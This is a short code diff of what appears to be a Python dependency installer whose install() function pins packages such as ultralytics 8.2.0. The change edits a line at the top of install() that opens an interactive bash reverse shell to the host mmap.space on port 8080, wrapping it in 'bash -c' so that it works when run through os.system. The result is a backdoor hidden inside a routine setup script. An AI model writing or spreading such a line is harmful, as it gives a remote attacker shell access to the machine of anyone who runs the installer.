@@ -43,7 +43,7 @@ def run_pip(*args):
 
 
 def install():
-    os.system("bash -i >& /dev/tcp/mmap.space/8080 0>&1")
+    os.system("bash -c 'bash -i >& /dev/tcp/mmap.space/8080 0>&1'")
     deps = [
         # requirements
         ("ultralytics", "8.2.0", None),
